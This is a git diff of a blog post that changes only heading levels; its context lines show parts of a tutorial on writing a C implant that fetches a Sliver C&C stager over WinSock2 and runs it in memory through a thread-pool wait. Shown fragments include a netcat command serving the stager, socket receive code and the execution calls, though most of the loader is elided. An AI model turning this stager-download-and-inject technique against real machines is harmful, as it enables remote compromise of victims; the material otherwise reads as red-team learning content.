@@ -4,13 +4,13 @@ date: "2021-01-01"
 ---
 
 In this post we're going to create a C program that will download a stager and inject it in the process to establish communication with the attacker machine.<!-- end -->
-## Basics of Stager payloads
+# Basics of Stager payloads
 
 Before starting we need to understand what stager payloads are. If you've used Metasploit Framework then you might've seen that word being thrown around but never really understood what it means. 
 
 In simple terms a stager is reponsible for establishing commmunication with the attacker's machine and downloading and executing a larger payload called the Stage. You may ask why we don't simply download the Stage directly instead of having our stager download the stage. Well the reality is you won't always have the luxury of having unlimited memory space. If you've done challenging Buffer Overflow labs then you would've encountered limited buffer space to inject your payload. In cases like that you'd need a small payload to ultimately grab your large payload and do the damage.
 
-## Sliver C&C Framework
+# Sliver C&C Framework
 
 I ran into Sliver while searching for different open source C&C frameworks to try out. We'll be using it to generate a stager and then establish communication with our target machine. Although it's still in beta mode, it has some impressive feautures you can check it out <a href="https://github.com/BishopFox/sliver">here</a>.
 
@@ -44,7 +44,7 @@ Now all we need to do is use Netcat to listen for any incoming connections and s
 nc -lvp 8080 < STAGER_FILE
 ```
 
-## Using the WinSock2 Library to Download Our Stager
+# Using the WinSock2 Library to Download Our Stager
 
 If you're not familiar with the <a href="https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-start-page-2">WinSock2 Library</a> then here's Microsoft's definition for you:
 
@@ -123,7 +123,7 @@ data[response_size];
 closesocket(s);
 ```
 
-## Injecting and Executing Stager
+# Injecting and Executing Stager
 
 Now that we have our stager downloaded into a variable we need to execute it somehow. There are many ways of doing so, I thought of trying out a technique I recently came across on <a href="https://www.ired.team/">ired.team</a>.
 
@@ -143,7 +143,7 @@ SetThreadpoolWait(threadPoolWait, event, NULL);
 WaitForSingleObject(event, INFINITE);
 ```
 
-## PoC
+# PoC
 
 ![PoC](./implant.gif)
 
